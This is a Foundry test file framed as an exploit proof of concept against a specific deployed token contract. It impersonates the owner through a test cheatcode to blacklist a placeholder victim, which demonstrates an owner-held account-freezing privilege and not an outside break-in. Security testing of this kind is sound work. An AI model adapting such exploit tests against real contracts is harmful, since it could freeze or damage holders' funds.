// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface TokenTool {
    function owner() external view returns (address);
    function multipleBotlistAddress(address[] calldata accounts, bool excluded) external;
    function _isBlacklisted(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);
    address victim = address(0x123);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll work with the deployed contract
        victim = address(0x123); // Example victim address
        vm.label(victim, "Victim");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the owner address
        address owner = TokenTool(TARGET).owner();
        vm.label(owner, "Owner");

        // Impersonate the owner
        vm.startPrank(owner);

        // Create array with victim address
        address[] memory victims = new address[](1);
        victims[0] = victim;

        // Call multipleBotlistAddress to blacklist the victim
        // Note: parameter 'excluded' when true means blacklisted
        TokenTool(TARGET).multipleBotlistAddress(victims, true);

        vm.stopPrank();

        // Verify the victim is blacklisted
        bool isBlacklisted = TokenTool(TARGET)._isBlacklisted(victim);
        require(isBlacklisted, "Victim should be blacklisted");
        assertEq(isBlacklisted, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
